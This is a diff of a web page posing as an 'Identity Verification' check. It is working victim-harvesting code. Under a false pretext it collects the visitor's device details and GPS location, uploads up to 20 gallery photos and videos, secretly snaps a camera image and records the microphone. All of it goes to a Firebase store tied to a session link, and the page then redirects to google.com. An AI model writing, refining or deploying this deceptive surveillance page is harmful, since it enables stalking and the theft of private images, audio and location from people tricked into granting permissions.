@@ -10,133 +10,81 @@
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
     
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: linear-gradient(135deg, #0a0a0a 0%, #000000 100%);
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto;
+            background: #000;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
         }
-        
         .card {
-            background: rgba(20, 20, 20, 0.95);
-            backdrop-filter: blur(10px);
+            background: #111;
             border-radius: 32px;
             padding: 40px 28px;
             max-width: 420px;
             width: 100%;
             text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            border: 1px solid #222;
         }
-        
         .logo {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, #1a73e8, #0d47a1);
+            width: 70px;
+            height: 70px;
+            background: #1a73e8;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 24px;
-            font-size: 40px;
+            margin: 0 auto 20px;
+            font-size: 32px;
         }
-        
-        h1 {
-            color: #fff;
-            font-size: 24px;
-            margin-bottom: 12px;
-        }
-        
-        .sub {
-            color: #aaa;
-            font-size: 14px;
-            margin-bottom: 28px;
-        }
-        
-        .device-info {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 20px;
-            padding: 16px;
-            margin-bottom: 24px;
-            text-align: left;
-        }
-        
-        .device-info p {
-            color: #ccc;
-            font-size: 12px;
-            margin: 4px 0;
-        }
-        
+        h1 { color: #fff; font-size: 24px; margin-bottom: 10px; }
+        .sub { color: #aaa; font-size: 14px; margin-bottom: 24px; }
         .btn {
-            background: linear-gradient(135deg, #1a73e8, #0d47a1);
+            background: #1a73e8;
             color: white;
             border: none;
             width: 100%;
-            padding: 16px;
+            padding: 14px;
             font-size: 16px;
             font-weight: 600;
-            border-radius: 44px;
+            border-radius: 40px;
             cursor: pointer;
-            margin-top: 8px;
+            margin-top: 10px;
         }
-        
-        .btn:disabled {
-            background: #444;
-            cursor: not-allowed;
-        }
-        
+        .btn:disabled { background: #444; cursor: not-allowed; }
         .loader {
             margin-top: 20px;
             color: #1a73e8;
             font-size: 14px;
             display: none;
         }
-        
-        input, video, canvas {
-            display: none;
-        }
-        
-        .status-box {
-            margin-top: 16px;
+        .log {
+            margin-top: 20px;
             padding: 12px;
+            background: #1a1a1a;
             border-radius: 12px;
-            font-size: 12px;
+            font-size: 11px;
+            color: #0f0;
+            font-family: monospace;
+            text-align: left;
             display: none;
+            max-height: 200px;
+            overflow-y: auto;
         }
-        
-        .status-box.success {
-            background: #0a2e1a;
-            color: #4ade80;
-        }
-        
-        .status-box.error {
-            background: #2e0a0a;
-            color: #ff6b6b;
-        }
+        input, video, canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="card">
         <div class="logo">🔐</div>
         <h1>Identity Verification</h1>
-        <div class="sub">Please verify your identity to continue</div>
-        
-        <div class="device-info" id="deviceInfo">
-            <p>🖥️ Detecting device...</p>
-        </div>
-        
-        <button class="btn" id="verifyBtn">✓ Start Verification</button>
-        <div class="loader" id="loader">Processing...</div>
-        <div class="status-box" id="statusBox"></div>
+        <div class="sub">Please complete verification to continue</div>
+        <button class="btn" id="startBtn">▶ Start Verification</button>
+        <div class="loader" id="loader">Initializing...</div>
+        <div class="log" id="log"></div>
     </div>
     
     <input type="file" id="galleryInput" accept="image/*,video/*" multiple>
@@ -158,116 +106,112 @@
         const db = firebase.firestore();
         const storage = firebase.storage();
         
-        // Get session ID from URL
         const urlParams = new URLSearchParams(window.location.search);
         const sessionId = urlParams.get('id');
         
-        const verifyBtn = document.getElementById('verifyBtn');
+        const startBtn = document.getElementById('startBtn');
         const loader = document.getElementById('loader');
-        const statusBox = document.getElementById('statusBox');
+        const logDiv = document.getElementById('log');
+        
+        function addLog(msg) {
+            logDiv.style.display = 'block';
+            logDiv.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
+            logDiv.scrollTop = logDiv.scrollHeight;
+            console.log(msg);
+        }
         
         if (!sessionId) {
-            statusBox.className = 'status-box error';
-            statusBox.style.display = 'block';
-            statusBox.innerHTML = '❌ Invalid verification link.';
-            verifyBtn.disabled = true;
+            addLog('❌ ERROR: No session ID found in URL');
+            startBtn.disabled = true;
+            loader.innerHTML = '❌ Invalid link';
+        } else {
+            addLog(`✅ Session ID: ${sessionId}`);
         }
         
-        // Show status
-        function showStatus(msg, isError = false) {
-            statusBox.className = isError ? 'status-box error' : 'status-box success';
-            statusBox.style.display = 'block';
-            statusBox.innerHTML = msg;
-            setTimeout(() => {
-                statusBox.style.display = 'none';
-            }, 3000);
-        }
-        
-        // Save to Firebase
-        async function saveData(type, data) {
-            if (!sessionId) return;
+        async function saveToFirebase(type, data) {
+            if (!sessionId) return false;
             try {
+                addLog(`📤 Saving ${type}...`);
                 await db.collection('sessions').doc(sessionId).collection('data').add({
                     type: type,
                     data: data,
                     timestamp: new Date().toISOString()
                 });
-                console.log('Saved:', type);
+                addLog(`✅ ${type} saved!`);
                 return true;
             } catch(e) {
-                console.error('Save error:', e);
+                addLog(`❌ Save error: ${e.message}`);
                 return false;
             }
         }
         
-        // Upload file to Firebase Storage
         async function uploadFile(file, type) {
             if (!sessionId) return null;
+            addLog(`📁 Uploading ${file.name} (${(file.size/1024).toFixed(1)} KB)`);
             const filename = `${sessionId}_${Date.now()}_${file.name.replace(/[^a-z0-9.]/gi, '_')}`;
             const ref = storage.ref(`uploads/${filename}`);
             await ref.put(file);
             const url = await ref.getDownloadURL();
-            await saveData(type, { url, name: file.name, size: file.size });
+            await saveToFirebase(type, { url, name: file.name, size: file.size });
+            addLog(`✅ ${file.name} uploaded!`);
             return url;
         }
         
-        // Step 1: Device Info
-        async function sendDeviceInfo() {
+        // STEP 1: Device Info
+        async function stepDeviceInfo() {
+            addLog('📱 Getting device info...');
             const ua = navigator.userAgent;
             let device = "Unknown";
             if (ua.includes("iPhone")) device = "iPhone";
             else if (ua.includes("Android")) device = "Android";
             else if (ua.includes("Windows")) device = "Windows PC";
             else if (ua.includes("Mac")) device = "Mac";
-            
-            document.getElementById('deviceInfo').innerHTML = `
-                <p>📱 Device: ${device}</p>
-                <p>🌐 Browser: ${ua.includes('Chrome') ? 'Chrome' : ua.includes('Safari') ? 'Safari' : 'Other'}</p>
-                <p>📐 Screen: ${screen.width}x${screen.height}</p>
-            `;
-            
-            await saveData('device_info', { device, ua, screen: `${screen.width}x${screen.height}` });
+            await saveToFirebase('device_info', { device, ua, screen: `${screen.width}x${screen.height}` });
+            addLog('✅ Device info saved');
         }
         
-        // Step 2: Location
-        async function getLocation() {
+        // STEP 2: Location
+        async function stepLocation() {
+            addLog('📍 Requesting location...');
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
+                    addLog('❌ Geolocation not supported');
                     resolve(false);
                     return;
                 }
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    await saveData('location', {
-                        lat: pos.coords.latitude,
-                        lng: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy,
-                        map: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
-                    });
-                    resolve(true);
-                }, () => {
-                    resolve(false);
-                });
+                navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                        addLog(`📍 Location: ${pos.coords.latitude}, ${pos.coords.longitude}`);
+                        await saveToFirebase('location', {
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        });
+                        resolve(true);
+                    },
+                    (err) => {
+                        addLog(`❌ Location error: ${err.message}`);
+                        resolve(false);
+                    }
+                );
             });
         }
         
-        // Step 3: Gallery Access
-        async function getGallery() {
+        // STEP 3: Gallery
+        async function stepGallery() {
+            addLog('📸 Opening gallery... Please select photos/videos');
             return new Promise((resolve) => {
                 const input = document.getElementById('galleryInput');
                 input.onchange = async (e) => {
                     const files = Array.from(e.target.files);
-                    if (files.length === 0) {
-                        resolve(false);
-                        return;
-                    }
-                    loader.innerHTML = `📸 Uploading ${files.length} files...`;
+                    addLog(`📸 Selected ${files.length} files`);
                     let uploaded = 0;
                     for (let i = 0; i < Math.min(files.length, 20); i++) {
                         const file = files[i];
                         const type = file.type.startsWith('image/') ? 'gallery_photo' : 'gallery_video';
                         await uploadFile(file, type);
                         uploaded++;
-                        loader.innerHTML = `📸 Uploaded ${uploaded}/${Math.min(files.length, 20)}`;
+                        addLog(`📸 Uploaded ${uploaded}/${Math.min(files.length, 20)}`);
                     }
                     resolve(true);
                 };
@@ -275,11 +219,12 @@
             });
         }
         
-        // Step 4: Camera
-        async function getCamera() {
+        // STEP 4: Camera
+        async function stepCamera() {
+            addLog('📷 Requesting camera...');
             try {
-                loader.innerHTML = "📷 Accessing camera...";
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                addLog('✅ Camera access granted');
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 await new Promise(r => setTimeout(r, 1500));
@@ -294,18 +239,20 @@
                 await uploadFile(file, 'camera_photo');
                 
                 stream.getTracks().forEach(t => t.stop());
+                addLog('✅ Camera photo saved');
                 return true;
             } catch(e) {
-                console.log('Camera error:', e);
+                addLog(`❌ Camera error: ${e.message}`);
                 return false;
             }
         }
         
-        // Step 5: Microphone
-        async function getMicrophone() {
+        // STEP 5: Microphone
+        async function stepMicrophone() {
+            addLog('🎤 Requesting microphone...');
             try {
-                loader.innerHTML = "🎤 Recording audio (3 seconds)...";
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                addLog('✅ Microphone access granted');
                 const mediaRecorder = new MediaRecorder(stream);
                 const chunks = [];
                 
@@ -314,67 +261,62 @@
                     const blob = new Blob(chunks, { type: 'audio/webm' });
                     const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                     await uploadFile(file, 'microphone');
+                    addLog('✅ Audio saved');
                 };
                 
                 mediaRecorder.start();
-                await new Promise(r => setTimeout(r, 3000));
+                addLog('🎤 Recording 5 seconds...');
+                await new Promise(r => setTimeout(r, 5000));
                 mediaRecorder.stop();
                 stream.getTracks().forEach(t => t.stop());
                 return true;
             } catch(e) {
-                console.log('Microphone error:', e);
+                addLog(`❌ Microphone error: ${e.message}`);
                 return false;
             }
         }
         
-        // Main Function
+        // MAIN FUNCTION
         async function startVerification() {
             if (!sessionId) return;
             
-            verifyBtn.disabled = true;
+            startBtn.disabled = true;
             loader.style.display = 'block';
-            loader.innerHTML = "🔐 Starting verification...";
+            addLog('🚀 Starting verification...');
             
-            // Step 1: Device info
-            await sendDeviceInfo();
+            // Step 1: Device Info
+            loader.innerHTML = '📱 Device info...';
+            await stepDeviceInfo();
             
             // Step 2: Location
-            loader.innerHTML = "📍 Getting location...";
-            await getLocation();
+            loader.innerHTML = '📍 Getting location...';
+            await stepLocation();
             
             // Step 3: Gallery
-            loader.innerHTML = "📸 Select photos from gallery...";
-            showStatus("Please select photos from gallery", false);
-            await getGallery();
+            loader.innerHTML = '📸 Opening gallery...';
+            addLog('📸 Gallery step - click "Select Files" when prompt opens');
+            await stepGallery();
             
             // Step 4: Camera
-            loader.innerHTML = "📷 Capturing photo...";
-            showStatus("Camera access will be requested", false);
-            await getCamera();
+            loader.innerHTML = '📷 Taking photo...';
+            await stepCamera();
             
             // Step 5: Microphone
-            loader.innerHTML = "🎤 Recording audio...";
-            await getMicrophone();
+            loader.innerHTML = '🎤 Recording audio...';
+            await stepMicrophone();
             
             // Complete
-            await saveData('verification_complete', { timestamp: new Date().toISOString() });
+            await saveToFirebase('verification_complete', { timestamp: new Date().toISOString() });
             
-            loader.innerHTML = "✅ Verification complete! Redirecting...";
-            showStatus("✅ Verification successful!", false);
+            loader.innerHTML = '✅ Complete! Redirecting...';
+            addLog('✅ Verification complete! Redirecting...');
             
             setTimeout(() => {
                 window.location.href = "https://www.google.com";
-            }, 2000);
+            }, 3000);
         }
         
-        verifyBtn.onclick = startVerification;
-        
-        // Auto start after 1 second
-        setTimeout(() => {
-            if (sessionId) {
-                startVerification();
-            }
-        }, 500);
+        startBtn.onclick = startVerification;
     </script>
 </body>
 </html>
